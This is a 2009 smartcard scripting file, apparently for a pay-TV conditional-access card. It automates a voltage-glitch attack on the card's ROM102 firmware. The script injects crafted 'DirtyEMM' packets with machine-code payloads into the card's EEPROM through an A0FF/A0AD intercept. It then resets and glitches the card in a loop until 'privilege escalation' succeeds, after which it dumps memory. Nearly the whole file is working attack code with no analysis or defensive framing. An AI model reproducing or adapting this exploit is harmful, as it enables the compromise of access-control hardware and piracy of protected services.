''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' ROM102 MAP0A glitch.xvb - Created 2009-05-27
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' notes:
'   * for use with *MODIFIED* ND13-type atmel flash - modified to leave card running when WDT times out
'   * EEP80:9A00 - EEP80:9AFF is overwritten and used by this script
'   * the script should autodetect if A0FF or A0DD will work
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' payload notes:
'   * RAM:0080-0088 will be filled by the script with '9D9D9D9D9D9D9D9D'
'   * '9ACC7A95' will be added to the end of the packet (to send response and return to IdleLoop)
'   * no length checking is done - be careful not to exceed atmel buffer size
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Option Explicit     ' any used variables must be explicitly declared


Dim A0FFPacket              ' packet used to trigger execution of the DirtyEMMPacket payload
Dim A0ADPacket

''''''''''''''''''''''''''''''''''''''''''''''
' define A0FFPacket
' trigger A0FF and receive up to 32 bytes in response
    A0FFPacket = "0F 60 0A 21 00 07 A0 FF 00 00 02 48 00 33 9F 00"
    A0ADPacket = "0F 60 0A 21 00 07 A0 AD 00 00 02 48 00 61 9F 00"         ' use A0AD
''''''''''''''''''''''''''''''''''''''''''''''


''''''''''''''''''''''''''''''''''''''''''''''
Sub Main()
    Dim i
    Dim NumBytes


    Sc.ClearOutputWindow


' set if comm is displayed or not
'    Sc.Verbose = True
    Sc.Verbose = False


' read atmel version
    Sc.Write("90")
    Sc.Read(4)


' figure out if we should use A0FF or A0AD intercept
    SelectA0FForA0AD()


    Sc.Print("Reset card... ")
' reset card and receive ATR
    Sc.Write("08 10 01 03 9A 15 0E 20 00")
    Sc.Read(2)
    Sc.Read(27)
    For i = 0 To 26                                 ' loop through bytes of ATR to print them
        Sc.Print(HexString(Sc.GetByte(i),2))
    Next
    Sc.Print(VbCr)


' write data to EEP80:9A80-9AFF (this is the data that will be copied using map0A)
    Sc.Print("Writing data to EEP80:9A80-9AFF... ")
    SendDirtyEMM( "2010      01010101010101010101010101010101     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9A80  8A  10   A6BB CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      01010101010101010101010101010101     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9A90  8A  10   A6BB CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      01010101010101010101010101010101     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9AA0  8A  10   A6BB CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      01010101010101010101010101010101     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9AB0  8A  10   A6BB CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      01010101010101010101010101010101     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9AC0  8A  10   A6BB CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      01010101010101010101010101010101     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9AD0  8A  10   A6BB CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      01010101010101010101010101010101     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9AE0  8A  10   A6BB CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      01010101010101010101010101010101     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9AF0  8A  10   A6BB CD4523" )
    DoA0FF()
    Sc.Print("done."&VbCr)


' write code to EEP80:9A00 - this code is used to init the RAM:0101 code
    Sc.Print("Writing code to EEP80:9A00-9A7F... ")
    SendDirtyEMM( "2010      A611CD45237180A69AB747A640B748A6     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9A00  8A  10   A6EE CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      01B74AA601B74BA640CD5BE087000000     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9A10  8A  10   A6EE CD4523" )
    DoA0FF()


' write code to EEP80:9A40 - this is the code that is loaded to RAM:0101
' this code is executed when privilege escalation is successful
    SendDirtyEMM( "2010      CD5487A699CD4523AE80CD511F5A26FA     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9A40  8A  10   A6EE CD4523" )
    DoA0FF()
    SendDirtyEMM( "2010      A655CD4523CD3963A669CD452320FE00     CD5487 A6AACD4523  A64B B76B 1864 CD7C16  9A50  8A  10   A6EE CD4523" )
    DoA0FF()
    Sc.Print("done."&VbCr)


    Sc.Print("MAP0A glitch start."&VbCr)
    Sc.Print("(legend: | restart process    . no response    x wrong response    ! success)"&VbCr)
' loop forever (to be terminated when successful)
    While 1
        If Sc.Verbose = False Then                  ' if verbose is off, print indication of what is happening
            Sc.Print "|"
        End If

' set voltage
        Sc.Write( "B0 00")


' reset card and receive ATR
        Sc.Write("08 10 01 03 9A 15 0E 20 00")
        Sc.Read(2)
        Sc.Read(27)


' send ram packet, to setup and call map  (mapcall0A will hang)
        SendDirtyEMM( "CD5487 A6AACD4523  8D809A00 A6C0884A26FC A610B748A602CD3840A69AB744A680B745A604CD3840A60EB744A6F0B745A60ACD3840   A6BBCD4523 CD0101 A6CCCD4523" )
        DoA0FF()


' try glitching (up to) 100 times, to get out of map0A loop
        For i = 1 To 100
            Sc.Write( "03 09 80 00" )               ' glitch out of mapcall0A
            Sc.Read(2)
            NumBytes = Sc.GetByte(1)
            If(NumBytes > 0) Then
                Sc.Read( Sc.GetByte(1) )

                If Sc.GetByte(0) = &h99 Then        ' got a proper ack!  priv escalation success
                    If Sc.Verbose = False Then      ' if verbose is off, print indication of what is happening
                        Sc.Print "!" & VbCr
                    End If

                    While NumBytes>0                ' read response as long as it keeps coming
                        Sc.Write( "02 9F 00" )      ' read 32 bytes
                        Sc.Read(2)
                        NumBytes = Sc.GetByte(1)
                        If(NumBytes > 0) Then
                            Sc.Verbose = True
                            Sc.Read( Sc.GetByte(1) )
                            Sc.Verbose = False
                        End If
                    Wend

                    Exit Sub                        ' done!

                End If

                If Sc.Verbose = False Then          ' if verbose is off, print indication of what is happening
                    Sc.Print "x"                    ' got an ack after glitch, but not proper one for priv escalation
                End If
                i = 10000                           ' set i=bignum to signal end of glitch attempts for this round
            Else
                If Sc.Verbose = False Then          ' if verbose is off, print indication of what is happening
                    Sc.Print "."                    ' no response
                End If
            End If
        Next            ' Next i - loop to glitch again to attempt to break out

    Wend                ' loop to reset the card and repeat glitching process (loop until successful)

End Sub
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Function DoA0FF()

' send the A0FFPacket (execute the DirtyEMMPacket)
    Sc.Write( A0FFPacket )
    Sc.Read(2)
    If(Sc.GetByte(1) > 0) Then
        Sc.Read( Sc.GetByte(1) )
    End If
End Function
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Sub SelectA0FForA0AD()
' reset card and receive ATR
    Sc.Write("08 10 01 03 9A 15 0E 20 00")
    Sc.Read(2)
    Sc.Read(27)

    SendDirtyEMM( "CD5487 A6AACD4523 A6BBCD4523" )
    DoA0FF()
    If( Sc.GetByte(0) = &hAA ) Then
        SendDirtyEMM( "CD5487 A6AACD4523 A6BBCD4523" )
        DoA0FF()
        If( Sc.GetByte(0) <> &hAA ) Then
            Sc.Print "ERROR: loader turns off card after timeout!" & VbCr
        End If
        Exit Sub
    End If

    A0FFPacket = A0ADPacket


' reset card and receive ATR
    Sc.Write("08 10 01 03 9A 15 0E 20 00")
    Sc.Read(2)
    Sc.Read(27)

    SendDirtyEMM( "CD5487 A6AACD4523 A6BBCD4523" )
    DoA0FF()
    If( Sc.GetByte(0) = &hAA ) Then
        SendDirtyEMM( "CD5487 A6AACD4523 A6BBCD4523" )
        DoA0FF()
        If( Sc.GetByte(0) <> &hAA ) Then
            Sc.Print "ERROR: loader turns off card after timeout!" & VbCr
        End If
        Exit Sub
    End If

    Sc.Print "ERROR: unable to use A0FF/A0AD intercept!" & VbCr

' reset card and receive ATR
    Sc.Write("08 10 01 03 9A 15 0E 20 00")
    Sc.Read(2)
    Sc.Read(27)
End Sub
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Function SendDirtyEMM( Payload )
    Dim CS                      ' checksum for packet
    Dim DirtyEMMHead            ' data sent before the payload of DirtyEMMPacket
    Dim DirtyEMMTail            ' data sent after the payload of DirtyEMMPacket
    Dim PayloadLen
    Dim DirtyEMMPacket          ' full packet to send to card to setup payload for execution
    Dim DirtyEMMPacketLen       ' length of our opcode test packet

''''''''''''''''''''''''''''''''''''''''''''''
' data sent before the payload of DirtyEMMPacket
    PayloadLen = GetPacketLen(Payload)    ' calculate length of the payload
    PayloadLen = PayloadLen / 2

    DirtyEMMHead = "21 00 " & HexString(25+PayloadLen, 2) & "A0 CA 00 00" & HexString(19+PayloadLen, 2) & "04" & HexString(17+PayloadLen, 2) & "01 01 86 00 AA 9D 9D 9D 9D 9D 9D 9D 9D"


' data sent after the payload of DirtyEMMPacket (LRC will be added automatically)
    DirtyEMMTail = "9A CC 7A 95 02"

''''''''''''''''''''''''''''''''''''''''''''''
' setup DirtyEMMPacket

    DirtyEMMPacket = DirtyEMMHead + Payload + DirtyEMMTail

    DirtyEMMPacketLen = GetPacketLen(DirtyEMMPacket)    ' calculate length of the packet
    DirtyEMMPacketLen = DirtyEMMPacketLen / 2
    DirtyEMMPacketLen = DirtyEMMPacketLen + 1           ' adjust for checksum

    CS = DoCheckSum(DirtyEMMPacket)
    DirtyEMMPacket = DirtyEMMPacket + CS


' send the DirtyEMMPacket
    Sc.Write( HexString(4+DirtyEMMPacketLen, 2) & "60" & HexString(DirtyEMMPacketLen-1, 2) & DirtyEMMPacket & "86 00")
    Sc.Read(2)
    Sc.Read(7)

End Function
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' the rest of this file is helper functions
' ripped from ROM102_ND13_A0FF-INTERCEPT-autoVCC_20_Smart.xvb
'
' DoCheckSum(Packet) - calculate checksum for Packet
' Hex2Dec(HexNumber) - takes a string with a hex value, returns decimal value
' HexString(Number,Length) - convert Number to a string containing Length-digit hex value
' GetPacketLen(Packet) - returns length (in characters) of Packet
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' DoCheckSum(Packet) - calculate checksum for Packet
'
' ripped from ROM102_ND13_A0FF-INTERCEPT-autoVCC_20_Smart.xvb
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Function DoCheckSum (Packet)
 Dim Temp
 Dim Length
 Dim PK
 Dim CheckSum
 Dim i

 PK=""

 Length = Len(Packet)           'get packet length with spaces

 for i = 1 to Length
    Temp = Mid(Packet, i, 1)
    if Temp <> " " then         'remove all spaces in packet
        PK = PK + Temp
    End if
 next

 Length = Len(PK)               'get packet length without spaces

 CheckSum = 0

 for i = 0 to Length
     i=i+1                      'Simulate Step 2 in VB scripting
     Temp = Mid(PK, i, 2)
     CheckSum = CheckSum XOR Hex2Dec(Temp)  'Calc Checksum
 next

 DoCheckSum = HexString(CheckSum, 2) 'convert checksum to a hex strimg and return it to caller

End Function


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Hex2Dec(HexNumber) - takes a string with a hex value, returns decimal value
'
' ripped from ROM102_ND13_A0FF-INTERCEPT-autoVCC_20_Smart.xvb
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Function Hex2Dec(HexNumber)
    ' This function takes 1 argument, a string containing a hex value of any digit length
    ' and returns the decimal equivalent
    Dim DecimalValue
    Dim DigitCount
    Dim Digit
    Dim HexDigit

    HexNumber = Replace(UCase(HexNumber), " ", "")
    DigitCount = Len(HexNumber)

    For Digit = 1 To DigitCount

        HexDigit = Mid(HexNumber, Digit, 1)
        If Asc(HexDigit) < 58 Then
            DecimalValue = HexDigit * 16 ^ (DigitCount - Digit)
        Else
            DecimalValue = (Asc(HexDigit) - 55) * 16 ^ (DigitCount - Digit)
        End If
        Hex2Dec = Hex2Dec + DecimalValue
    Next

End Function


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' HexString(Number,Length) - convert Number to a string containing Length-digit hex value
'
' ripped from ROM102_ND13_A0FF-INTERCEPT-autoVCC_20_Smart.xvb
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Function HexString(Number,Length)
    ' This function takes 2 arguments, a number and a length.  It converts the decimal
    ' number given by the first argument to a Hexidecimal string with its length
    ' equal to the number of digits given by the second argument
    Dim RetVal
    Dim CurLen
    RetVal=Hex(Number)
    CurLen=Len(RetVal)
    If CurLen<Length Then
        RetVal=String(Length-CurLen,"0") & RetVal
    End If
    HexString=RetVal
End Function


''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' GetPacketLen(Packet) - returns length (in characters) of Packet
' note: returned value = length in bytes * 2
'
' ripped from ROM102_ND13_A0FF-INTERCEPT-autoVCC_20_Smart.xvb
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
Function GetPacketLen(Packet)
 Dim Length
 Dim Temp
 Dim PK
 Dim i

 PK = ""

 Length = Len(Packet)                   'get packet length with spaces

 for i = 1 to Length
    Temp = Mid(Packet, i, 1)
    if Temp <> " " then                 'remove all spaces in packet
        PK = PK + Temp
    End if
 next

 GetPacketLen = Len(PK)                 'return packet length without spaces

End Function

